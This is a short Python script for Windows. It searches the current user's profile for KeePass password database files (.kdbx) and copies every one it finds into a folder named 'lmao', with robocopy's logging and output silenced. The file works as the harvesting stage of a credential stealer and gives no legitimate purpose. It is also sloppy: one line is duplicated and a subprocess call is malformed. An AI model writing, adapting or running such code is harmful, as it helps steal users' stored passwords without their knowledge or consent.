import os
import subprocess
import datetime
from subprocess import CompletedProcess

logged_user_os_fix = os.environ['USERPROFILE']

logged_user_os_fix = os.environ['USERPROFILE']
folder_loc_for_fix = '{}\lmao'.format(logged_user_os_fix)

folders = []
location_of_folder = subprocess.run(['cmd.exe', ['/c cd {} && dir *.kdbx /s'.format(logged_user_os_fix)]],stdout=subprocess.PIPE)
location_of_folder = location_of_folder.stdout.decode('utf-8')
location_of_folder = str(location_of_folder)
location_of_folder = location_of_folder.split()
for x in location_of_folder:
    if '\\' in x:
        folders.append(x)

for x in folders:
    os.system('@echo off && robocopy {} {} *.kdbx /NFL /NDL /NJH /NJS /nc /ns /np >nul 2>&1'.format(x, folder_loc_for_fix))